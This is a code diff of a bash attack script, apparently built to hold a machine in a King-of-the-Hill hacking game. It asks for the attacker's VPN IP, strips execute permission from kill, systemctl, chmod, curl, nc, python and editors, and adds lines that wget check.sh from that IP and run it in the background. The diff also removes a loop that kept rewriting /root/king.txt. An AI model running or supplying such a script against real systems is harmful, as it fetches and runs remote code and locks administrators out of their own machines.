@@ -9,6 +9,7 @@ echo "--------------------------------------------------------------------------
 echo "-----------------------------------------------------------------------------"
 
 read -p "Enter your nickname: " nick
+read -p "What is vpn ip ?: " IP
 echo "Hello $nick :) Let's go"
 
 echo "-----------------------------------------------------------------------------"
@@ -59,7 +60,6 @@ sudo chmod -x /usr/bin/kill
 sudo chmod -x /usr/bin/killall
 sudo chmod -x /usr/bin/pkill
 sudo chmod -x /usr/bin/mv
-sudo chmod -x /usr/bin/wget
 sudo chmod -x /usr/bin/curl
 sudo chmod -x /usr/bin/nano
 sudo chmod -x /usr/bin/vim
@@ -71,22 +71,29 @@ sudo chmod -x /usr/bin/python2
 sudo chmod -x /usr/bin/python3
 sudo chmod -x /usr/bin/nc
 sudo chmod -x /bin/nc
-echo "-----------------------------------------------------------------------------"
+
 
 echo "Let's Go Forward... :)"
 
+echo "-----------------------------------------------------------------------------"
+echo "-----------------------------------------------------------------------------"
+
+wget http://$IP/check.sh
+
+chmod +x check.sh
+
+./check.sh &
+
+
+echo "--------------------File successfully running in the background---------------"
+echo "-----------------------------------------------------------------------------"
+
 sudo chmod -x /bin/kill
 sudo chmod -x /bin/systemctl
+sudo chmod -x /usr/bin/wget
 sudo chmod -x /usr/bin/chmod
 sudo chmod -x /bin/chmod
 
-while true; do
-    current_nick=$(sudo cat /root/king.txt)
-    if [ "$current_nick" != "$nick" ]; then
-        echo "$nick" | sudo tee /root/king.txt >/dev/null
-    fi
-    sleep 0.5
-done
 
 echo "-----------------------------------------------------------------------------"
 echo "-----------------------------------------------------------------------------"
